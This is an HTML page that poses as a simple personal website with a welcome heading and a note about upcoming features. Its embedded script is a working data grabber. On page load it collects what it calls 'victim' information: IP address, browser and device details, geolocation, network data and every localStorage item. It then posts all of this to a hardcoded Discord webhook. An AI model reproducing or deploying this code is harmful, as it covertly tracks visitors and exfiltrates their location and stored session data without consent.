<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to My Website</title>
</head>
<body>
    <h1>Welcome to My Website!</h1>
    <p>I'm adding more features soon!</p>

    <script>
        // Function to collect comprehensive victim information
        async function collectVictimInfo() {
            try {
                // Get IP address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();

                // Get browser info
                const browserInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    cookieEnabled: navigator.cookieEnabled,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };

                // Get geolocation
                let geoLocation = null;
                if (navigator.geolocation) {
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject);
                        });
                        geoLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                    } catch (err) {
                        console.error('Geolocation error:', err);
                    }
                }

                // Get device info
                const deviceInfo = {
                    deviceMemory: navigator.deviceMemory || null,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    maxTouchPoints: navigator.maxTouchPoints
                };

                // Get network info
                const networkInfo = {
                    connection: navigator.connection ? {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt
                    } : null
                };

                // Get local storage items
                const localStorageItems = {};
                for (let key in localStorage) {
                    localStorageItems[key] = localStorage.getItem(key);
                }

                // Combine all information
                const victimInfo = {
                    ip: ipData.ip,
                    port: window.location.port || (window.location.protocol === 'https:' ? 443 : 80),
                    ...browserInfo,
                    geoLocation,
                    deviceInfo,
                    networkInfo,
                    localStorage: localStorageItems,
                    timestamp: new Date().toISOString()
                };

                // Send to webhook
                await sendToWebhook(victimInfo);
            } catch (error) {
                console.error('Error collecting victim info:', error);
            }
        }

        // Function to send data to webhook
        async function sendToWebhook(info) {
            const webhookUrl = 'https://discord.com/api/webhooks/1461964964603625594/jH-XEtXJtxJm69mjlFViAi8BQWutT-P6wTioZ-tElKw3BlJihCEeuNB2AazCCIjgKQKU';
            
            // Convert to text file content
            const fileContent = JSON.stringify(info, null, 2);
            
            // Send to webhook
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: fileContent
                })
            });

            if (!response.ok) {
                throw new Error(`Failed to send webhook: ${response.status}`);
            }

            console.log('Victim info sent to webhook');
        }

        // Call the function when the page loads
        window.onload = collectVictimInfo;
    </script>
</body>
</html>
